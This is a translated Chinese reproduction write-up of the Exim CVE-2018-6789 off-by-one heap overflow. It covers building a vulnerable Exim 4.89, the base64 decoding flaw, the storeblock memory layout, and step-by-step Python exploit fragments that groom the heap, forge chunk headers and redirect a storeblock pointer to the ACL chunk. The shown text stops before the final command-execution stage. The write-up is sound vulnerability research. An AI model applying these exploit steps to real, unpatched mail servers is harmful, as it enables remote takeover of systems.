# Exim Off-By-One 漏洞在真实环境中的利用分析

##### 译文声明
本文为翻译文章，具体内容和含义请以原文为准。

## 1. 前言
Exim是一款基于Linux平台的开源邮件服务器。2018年2月，研究人员Meh发现了一个堆溢出漏洞（CVE-2018-6789），该漏洞影响了所有4.91版本之前的Exim版本。Meh在其博客中提供了通过此漏洞实现远程代码执行的思路，但并未公开具体的漏洞利用代码。然而，其他研究人员在Docker环境中成功复现了该漏洞，并结合暴力破解的方法实现了远程命令执行，且发布了利用代码。尽管如此，Docker环境与实际环境仍存在差异。虽然也有研究者在Ubuntu的真实环境中重现了该漏洞，但他们未详细解释过程，也未分享其利用代码。因此，我根据Docker环境下的利用脚本，在真实环境中进行了漏洞复现尝试，并在此记录我的复现过程，欢迎指正。

## 2. 环境搭建
### 2.1 系统环境
- Linux发行版：Kali
- 内核版本：4.14.0-kali3-amd64
- 架构：x86_64

### 2.2 编译环境
- ldd版本：Debian GLIBC 2.27-2

### 2.3 Exim安装
```bash
apt-get -y update && \
DEBIAN_FRONTEND=noninteractive apt-get install -y \
wget xz-utils make gcc libpcre++-dev libdb-dev libxt-dev libxaw7-dev tzdata telnet && \
rm -rf /var/lib/apt/lists/* && \
wget https://github.com/Exim/exim/releases/download/exim-4_89/exim-4.89.tar.xz && \
tar xf exim-4.89.tar.xz && cd exim-4.89 && \
cp src/EDITME Local/Makefile && cp exim_monitor/EDITME Local/eximon.conf && \
sed -i 's/# AUTH_CRAM_MD5=yes/AUTH_CRAM_MD5=yes/' Local/Makefile && \
sed -i 's/^EXIM_USER=/EXIM_USER=exim/' Local/Makefile && \
useradd exim && make && mkdir -p /var/spool/exim/log && \
cd /var/spool/exim/log && touch mainlog paniclog rejectlog && \
chown exim mainlog paniclog rejectlog && \
echo "Asia/Shanghai" > /etc/timezone && \
cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
```

### 2.4 配置文件内容
```plaintext
acl_smtp_mail=acl_check_mail
acl_smtp_data=acl_check_data
begin acl
acl_check_mail:
.ifdef CHECK_MAIL_HELO_ISSUED
deny
message = no HELO given before MAIL command
condition = ${if def:sender_helo_name {no}{yes}}
.endif
accept
acl_check_data:
accept
begin authenticators
fixed_cram:
driver = cram_md5
public_name = CRAM-MD5
server_secret = ${if eq{$auth1}{ph10}{secret}fail}
server_set_id = $auth1
```

### 2.5 Exim启动命令
```bash
./exim –bd –d-receive –C conf.conf
```

## 3. 漏洞原理
Exim在处理Base64编码的数据时，会分配`3*(len/4)+1`字节的空间来存储解码后的数据。当输入数据长度为4n+3个字节时，Exim将分配3n+1字节的空间，但实际上解码后的数据需要3n+2字节，导致堆上发生一个字节的溢出，即经典的off-by-one漏洞。

## 4. Exim内存管理
### 4.1 Chunk结构
glibc在每个chunk开头使用0x10字节（x86-64）存储相关信息，包括前一个chunk的大小、当前chunk大小及标志位。Size字段的前三位表示标志位，最后一位表示前一个chunk是否被使用。例如，0x81表示当前chunk大小为0x80字节，且前一个chunk正在使用。

### 4.2 Storeblock结构
Exim在标准glibc堆管理机制基础上引入了storepool和storeblock的概念。Storepool是一个单链表结构，每个节点都是一个storeblock，最小大小为0x2000字节。Storeblock结构包含在chunk内，并额外包含一个指向下一个storeblock的next指针和当前storeblock的大小。

### 4.3 Storeblock管理
Storepool的数据存储方式如下：
- chainbase作为头结点指向第一个storeblock。
- current_block作为尾节点指向最后一个storeblock。
- store_last_get指向current_block中最后分配的空间。
- next_yield指向下一次分配空间的起始位置。
- yield_length表示当前storeblock中剩余可分配字节数。
当current_block中的剩余字节数小于请求分配的字节数时，系统将调用malloc分配新的storeblock块并从中分配所需空间。

### 4.4 堆分配函数及规则
Exim主要使用的已释放chunk会被放入unsorted bin双向链表。Glibc根据标识维护这些chunk，合并相邻且已释放的chunk以避免碎片化。对于每个内存分配请求，glibc按照FIFO顺序检查unsorted bin里的chunk并重新使用。Exim采用store_get()、store_release()、store_extend()和store_reset()等函数维护自己的链表结构。

## 5. 漏洞复现
### 5.1 EHLO布局堆空间
```python
ehlo(s, "a"*0x1000)
ehlo(s, "a"*0x20)
```
形成一个0x7040字节大小的unsorted bin。

### 5.2 发送未识别命令
```python
docmd(s, "xee"*0x700)
```
从unsorted bin分配新的storeblock。发送的未识别命令大小满足`length + nonprintcount*3 + 1 > yield_length`，促使store_get函数调用malloc分配新storeblock。

### 5.3 回收未识别命令分配的内存
```python
ehlo(s, "c"*(0x2c00))
```
EHLO 0x2c00字节，回收未识别命令分配的内存，空出0x2020字节空间。但在真实环境中，之前`ehlo(s, "a"*0x20)`占用的0x30字节内存并未释放，只空出0x2020字节空间。

### 5.4 触发off-by-one漏洞，修改chunk大小
```python
docmd(s, "AUTH CRAM-MD5")
payload1 = "d"*(0x2020-0x18-1)
docmd(s, b64encode(payload1)+"EfE")
```
`payload1 = "d"*(0x2020-0x18-1)`这句代码跟Docker环境中的代码不同，少加了一个0x30，因为实际环境中`ehlo(s, "a"*0x20)`占用的0x30字节内存并未释放。

### 5.5 伪造chunk信息
```python
docmd(s, "AUTH CRAM-MD5")
payload2 = p64(0x1f41)+'m'*0x70 # 修改伪造大小
docmd(s, b64encode(payload2))
```
伪造chunk头。

### 5.6 释放被改掉大小的chunk
```python
ehlo(s, "a+")
```
为了不释放其他storeblock，发送包含无效字符的信息。

### 5.7 修改storeblock的next指针
```python
docmd(s, "AUTH CRAM-MD5")
acl_chunk = p64(0x5653564c1000+0x66f0)  # acl_chunkr = &heap_base + 0x66f0
payload3 = 'a'*0x2bf0 + p64(0) + p64(0x2021) + acl_chunk
docmd(s, b64encode(payload3)) # 伪造chunk头和storeblock next
```
通过`x /18xg &acl_smtp_mail`可以得到acl_check_mail字符串的地址，从而找到acl_check_mail所在chunk的地址。修改storeblock的next指针，指向acl字符串所在的chunk。

### 5.8 释放storeblock
```python
ehlo(s, 'crashed')
```
包含ACL的storeblock被回收到unsorted bin中。

以上就是在真实环境中对Exim off-by-one漏洞的复现过程。希望对您有所帮助。如有错误，请指正。